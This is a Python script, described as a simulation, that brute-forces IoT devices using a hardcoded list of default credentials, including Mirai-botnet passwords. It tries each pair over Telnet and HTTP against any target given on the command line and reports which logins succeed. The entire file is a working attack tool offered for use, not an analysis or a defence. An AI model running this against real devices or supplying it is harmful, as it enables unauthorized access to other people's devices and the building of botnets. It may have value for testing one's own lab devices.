#!/usr/bin/env python3
"""
Simulates credential stuffing against IoT devices.
Tries common default IoT passwords via Telnet and HTTP.
"""
import socket
import sys
import time

IOT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", ""), ("root", "root"), ("root", ""),
    ("root", "admin"), ("root", "password"), ("user", "user"),
    ("admin", "admin1234"), ("support", "support"),
    ("guest", "guest"), ("admin", "pass"), ("root", "1234"),
    ("admin", "12345"), ("root", "12345"), ("admin", "default"),
    ("root", "toor"), ("admin", "888888"), ("root", "vizxv"),
    ("root", "xc3511"), ("root", "888888"), ("admin", "juantech"),
    ("root", "54321"), ("root", "anko"), ("supervisor", "supervisor"),
    ("root", "Zte521"), ("root", "hi3518"), ("root", "jvbzd"),
    ("root", "klv123"), ("root", "7ujMko0admin"),
]

def telnet_brute(target, port=2323):
    print(f"[Credential Stuffing] Telnet brute-force -> {target}:{port}")
    for user, pwd in IOT_CREDENTIALS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.recv(256)
            s.send(f"{user}\n".encode())
            time.sleep(0.2)
            s.recv(256)
            s.send(f"{pwd}\n".encode())
            time.sleep(0.2)
            resp = s.recv(256)
            status = "SUCCESS" if b"incorrect" not in resp.lower() else "FAIL"
            print(f"  {user}/{pwd} -> {status}")
            s.close()
            time.sleep(0.05)
        except Exception as e:
            print(f"  {user}/{pwd} -> ERROR: {e}")

def http_brute(target, port=8080):
    print(f"\n[Credential Stuffing] HTTP brute-force -> {target}:{port}")
    for user, pwd in IOT_CREDENTIALS[:10]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            request = (
                f"GET /?user={user}&pass={pwd} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Authorization: Basic {user}:{pwd}\r\n\r\n"
            )
            s.send(request.encode())
            resp = s.recv(1024)
            print(f"  {user}/{pwd} -> {len(resp)} bytes response")
            s.close()
            time.sleep(0.05)
        except Exception as e:
            print(f"  {user}/{pwd} -> ERROR: {e}")

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    print(f"=== IoT Credential Stuffing Attack ===")
    print(f"Target: {target}")
    print(f"Credentials to try: {len(IOT_CREDENTIALS)}\n")
    telnet_brute(target)
    http_brute(target)
    print("\n=== Attack complete ===")
